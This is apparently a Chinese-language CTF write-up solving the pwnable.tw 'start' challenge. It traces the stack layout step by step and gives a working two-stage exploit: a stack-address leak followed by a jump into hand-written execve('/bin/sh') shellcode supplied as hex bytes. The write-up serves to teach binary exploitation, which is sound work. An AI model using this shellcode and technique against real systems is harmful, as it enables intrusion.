# Speedrun：pwnable.tw `start`（ret2shellcode / 栈可执行）

> 题型：**栈溢出 + 栈地址自泄漏 + 栈上 shellcode**
> 亮点：`read(0, esp, 0x3c)` 的写入目标就是当前栈顶，而栈上恰好压着“原始 esp”，
> 一次溢出同时完成 leak 与控制流劫持；栈是 RWX 的，所以最后不需要 ROP，直接执行 shellcode
> 出处：pwnable.tw 10000 `start`（564 字节、32 位静态汇编、无 libc、无符号）

---

## 0. 一句话结论

```text
32 位、No PIE（EXEC）、**GNU_STACK = RWX（栈可执行）**、无 canary、静态、not stripped

_start @0x08048060:
  push esp                    ; [esp] = 原始 esp（泄漏点就藏在这里）
  push 0x0804809d             ; 伪返回地址，正常流程回 _exit
  ...
  write(1, "Let's start the CTF:", 20)     ; eax=4, ebx=1, ecx=esp, edx=0x14
  read(0, esp, 0x3c)          ; eax=3, ebx=0, ecx=esp, edx=0x3c   <-- 溢出点
  add esp, 0x14
  ret                         ; 从栈上取返回地址（可被上面 0x3c 字节覆盖）
_exit @0x0804809d:
  pop esp; xor eax,eax; inc eax; int 0x80

两轮：
1) ret -> 0x08048087（mov ecx,esp; mov dl,0x14; mov bl,1; mov al,4; int 0x80）
   -> write(1, esp, 20) 把栈上保存的原始 esp 打出来 = 栈地址 leak
2) 第二次 read 的目标 = leak-4；payload+0x14 覆盖返回地址；payload+0x18 放 shellcode
   -> ret 直接落到栈上的 execve("/bin/sh")（21 字节）
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2shellcode'

file pwnable_start                      # ELF 32-bit i386, statically linked
readelf -hW pwnable_start | grep Type    # EXEC -> No PIE
readelf -lW pwnable_start | grep STACK   # GNU_STACK RW -> 等等，看下一条注释
objdump -d -M intel pwnable_start

# 注意：这段程序的 GNU_STACK 是 RWX（pwntools 报 EXECSTACK），
# 是这道题"能直接执行栈上 shellcode"的前提；如果 NX 打开就只能 ROP。
```

`readelf -lW` 里如果 `GNU_STACK` 的 Flag 是 `RWE` → 栈可执行，直接 `shellcode` 路线；
只有 `RW` → NX，栈上执行不了，要改走 ROP（这题就不适用了）。

---

## 2. 逆向：栈布局一步步推

进入 `_start` 时 `esp = E`，执行到 `read` 之前：

```text
push esp            -> [E-4]  = E            （原始栈指针，泄漏源）
push 0x0804809d      -> [E-8]  = 0x0804809d  （正常流程的返回地址）
push 字符串 ×5        -> [E-28] = "Let's start the CTF:"   <- 此时 esp = S = E-28
mov ecx, esp         -> read 目标 = S
read(0, S, 0x3c)     -> 覆盖 [S, S+0x3c) = [E-28, E+0x20)
add esp, 0x14        -> esp = E-8
ret                  -> 取 [E-8]（已被覆盖）
```

第一轮把它覆盖成 `0x08048087`，此时：

```text
跳过去时 esp = E-4
mov ecx, esp   -> ecx = E-4
int 0x80       -> write(1, E-4, 20)
输出前 4 字节   = [E-4] = E   <-- 这就是 leak，值本身是"原始 esp"
write 之后继续  0x08048091: read(0, ecx=E-4, 0x3c)   <-- 第二次写入点
add esp, 0x14  -> esp = E+0x10
ret            -> 取 [E+0x10]
```

所以第二次 payload 的基址是 **leak-4**，返回地址在 **+0x14**，shellcode 放在 **+0x18**：

```text
payload[0x00:0x14] = 'A'*20
payload[0x14:0x18] = p32(leak - 4 + 0x18)   # 指向 shellcode
payload[0x18:...]  = shellcode（21 字节）
总长 0x18+21 = 45 ≤ 0x3c(60) ✓
```

---

## 3. 利用代码（关键 6 行）

```python
io.recvuntil(b"Let's start the CTF:")
io.send(b'A'*0x14 + p32(0x08048087))      # 触发 write(1, esp, 20)
leak = u32(io.recvn(4))                   # leak == 原始 esp
io.send(b'A'*0x14 + p32(leak-4+0x18) + SHELLCODE)
io.sendline(b'echo __PWNED__; cat flag.txt')
```

```python
SHELLCODE = bytes.fromhex("31d252682f2f7368682f62696e89e331c9b00bcd80")
# xor edx,edx; push edx; push "//sh"; push "/bin"; mov ebx,esp;
# xor ecx,ecx; mov al,0xb; int 0x80
```

实测输出：

```text
[+] stack leak: 0xffa136a0
-=..__PWNED__
flag{START_LOCAL}
```

---

## 4. 坑点清单（都是踩过的）

1. **地址是 `leak-4` 不是 `leak+4`**。
   `leak` = `push esp` 压进去的原始 esp，而第二次 `read` 从 `E-4` 开始写，
   所以 payload 基址 = `leak-4`。第一次我按 `leak+4+0x18` 算，直接 SIGSEGV。
2. **不要用 `p32(leak+0x18)` 之类“看着对”的式子**，一定按上面的栈布局逐条推。
3. **`asm(shellcraft.sh())` 在本机会失败**：没有 32 位 libc/`crt`，`gcc -m32` 链接不过。
   直接手写 21 字节机器码最省事（`as --32` 可用，但 pwntools 默认走 gcc）。
4. **这题做不了 SROP**（很多人一开始会这么想）：
   进入 `int 0x80` 之前的指令是写死的（`mov al,4` / `mov al,3` / `inc eax`），
   无法把 `eax` 置成 11（`rt_sigreturn`）。`read` 的返回值虽然等于发送长度，
   但下一条指令不是 `int 0x80`，所以“用 read 返回值当 syscall 号”这条也不成立。
   → SROP 需要另找题（或自造：`read` 溢出 + 一个 `syscall; ret` + 无其他 gadget）。
5. **远程靶机可能已经不下发这道题**（pwnable.tw 老题偶有下线），远程跑不通时以本地为准。

---

## 5. 识别卡（下次 5 秒认出来）

```text
看到 "ELF 32-bit, 564 字节, statically linked, not stripped"
+ 反汇编里出现 push esp / read(0, esp, 0x??)
+ GNU_STACK = RWE
=> ret2shellcode：一轮 leak 栈地址，一轮写 shellcode 到栈上跳过去
```

| 关键量 | 值 |
| --- | --- |
| leak gadget | `0x08048087` |
| 返回地址偏移 | `0x14` |
| shellcode 偏移 | `0x18` |
| payload 基址 | `leak - 4` |
| shellcode 长度上限 | `0x3c - 0x18 = 36` 字节 |
